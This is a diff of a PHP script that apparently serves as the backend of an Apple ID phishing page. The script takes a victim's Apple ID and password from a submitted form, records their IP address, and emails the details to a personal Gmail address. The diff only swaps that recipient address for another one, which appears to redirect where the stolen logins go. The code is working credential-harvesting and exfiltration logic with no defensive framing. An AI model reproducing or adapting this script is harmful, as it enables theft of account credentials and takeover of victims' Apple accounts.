@@ -1,6 +1,6 @@
 <?php 
 $email= $_POST['appleid'];
-$pass= $_POST['password'];
+$pass= $_POST['password']; 
 function getUserIP()
 {
     $client  = @$_SERVER['HTTP_CLIENT_IP'];
@@ -33,7 +33,7 @@ $headers  = 'MIME-Version: 1.0' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
 // Send email with reply
-$to  = "tirunehkibrom@gmail.com";
+$to  = "mostafamedht98@gmail.com";
 
 // Subject
 $subject = 'Email Account Details';
